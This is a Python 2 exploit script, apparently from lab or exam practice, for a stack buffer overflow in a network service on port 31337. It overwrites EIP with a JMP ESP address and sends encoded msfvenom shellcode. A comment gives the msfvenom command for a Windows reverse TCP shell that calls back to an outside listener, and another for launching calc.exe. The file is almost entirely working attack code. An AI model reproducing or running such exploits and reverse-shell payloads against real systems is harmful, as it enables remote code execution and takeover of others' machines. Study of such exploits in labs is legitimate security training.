#!/usr/bin/env python2
#st4rry made This

import socket
import struct

#Specify target ip and port

RHOST = '192.168.25.131'
RPORT = 31337

#Badchar
#badchar_test = ""
#unibadchars = [0x00, 0x0A, 0x0D]

#for badchar in range (0x00, 0xFF+1):
#    if badchar not in unibadchars:
#    badchar_test += chr(badchar)

#with open ("badchar_test.list", "wb") as f:
#    f.write(badchar_test)

#Make TCP connection (socket)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect ((RHOST,RPORT))

#Make buffer message to send to the service over the socket 

buf_total = 1024
eip_offset = 146
jmp_esp = 0x080414C3
sub_esp = "\x83\xEC\x10"

#msfvenom -p windows/exec -b "\x00\x0A\x0D" -f python --var-name shells CMD=calc.exe EXITFUNC=thread -e x86/shikata_ga_nai
#msfvenom -p windows/shell_reverse_tcp LHOST=10.10.0.92 LPORT=9984 -f python -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread --var-name shells

shells =  ""
shells += "\xba\xd8\x9f\x9a\x1b\xd9\xd0\xd9\x74\x24\xf4\x5f"
shells += "\x31\xc9\xb1\x52\x31\x57\x12\x83\xc7\x04\x03\x8f"
shells += "\x91\x78\xee\xd3\x46\xfe\x11\x2b\x97\x9f\x98\xce"
shells += "\xa6\x9f\xff\x9b\x99\x2f\x8b\xc9\x15\xdb\xd9\xf9"
shells += "\xae\xa9\xf5\x0e\x06\x07\x20\x21\x97\x34\x10\x20"
shells += "\x1b\x47\x45\x82\x22\x88\x98\xc3\x63\xf5\x51\x91"
shells += "\x3c\x71\xc7\x05\x48\xcf\xd4\xae\x02\xc1\x5c\x53"
shells += "\xd2\xe0\x4d\xc2\x68\xbb\x4d\xe5\xbd\xb7\xc7\xfd"
shells += "\xa2\xf2\x9e\x76\x10\x88\x20\x5e\x68\x71\x8e\x9f"
shells += "\x44\x80\xce\xd8\x63\x7b\xa5\x10\x90\x06\xbe\xe7"
shells += "\xea\xdc\x4b\xf3\x4d\x96\xec\xdf\x6c\x7b\x6a\x94"
shells += "\x63\x30\xf8\xf2\x67\xc7\x2d\x89\x9c\x4c\xd0\x5d"
shells += "\x15\x16\xf7\x79\x7d\xcc\x96\xd8\xdb\xa3\xa7\x3a"
shells += "\x84\x1c\x02\x31\x29\x48\x3f\x18\x26\xbd\x72\xa2"
shells += "\xb6\xa9\x05\xd1\x84\x76\xbe\x7d\xa5\xff\x18\x7a"
shells += "\xca\xd5\xdd\x14\x35\xd6\x1d\x3d\xf2\x82\x4d\x55"
shells += "\xd3\xaa\x05\xa5\xdc\x7e\x89\xf5\x72\xd1\x6a\xa5"
shells += "\x32\x81\x02\xaf\xbc\xfe\x33\xd0\x16\x97\xde\x2b"
shells += "\xf1\x92\x14\x33\x5d\xcb\x2a\x33\x7a\x0b\xa2\xd5"
shells += "\xee\x1b\xe2\x4e\x87\x82\xaf\x04\x36\x4a\x7a\x61"
shells += "\x78\xc0\x89\x96\x37\x21\xe7\x84\xa0\xc1\xb2\xf6"
shells += "\x67\xdd\x68\x9e\xe4\x4c\xf7\x5e\x62\x6d\xa0\x09"
shells += "\x23\x43\xb9\xdf\xd9\xfa\x13\xfd\x23\x9a\x5c\x45"
shells += "\xf8\x5f\x62\x44\x8d\xe4\x40\x56\x4b\xe4\xcc\x02"
shells += "\x03\xb3\x9a\xfc\xe5\x6d\x6d\x56\xbc\xc2\x27\x3e"
shells += "\x39\x29\xf8\x38\x46\x64\x8e\xa4\xf7\xd1\xd7\xdb"
shells += "\x38\xb6\xdf\xa4\x24\x26\x1f\x7f\xed\x46\xc2\x55"
shells += "\x18\xef\x5b\x3c\xa1\x72\x5c\xeb\xe6\x8a\xdf\x19"
shells += "\x97\x68\xff\x68\x92\x35\x47\x81\xee\x26\x22\xa5"
shells += "\x5d\x46\x67"

#Exploiting 
buf = ""
buf += "A" * 146  #+ "B" * 4 + "C" * (buf_total - eip_offset - 4)
buf += struct.pack("<I", jmp_esp) #EIP overwrite with Little-Endian arch 
buf += sub_esp #space for decoder stub
buf += shells #shell code
#buf += "\xCC\xCC\xCC\xCC" #INT3
buf += "C" * (buf_total - len(buf)) #len of buf before substract will be (146 + 4 + 4)
buf += "\n"

#Send the message to the service over the socket
print "\n"

s.send(buf)

#Print what we sent 

print "We Sent: {0}".format(buf)

#Receive data responsed from the service over the socket

data = s.recv(1024)

#Print what we received

print "RECEIVED: {0}".format(data)


#End

print "DONE!\n"
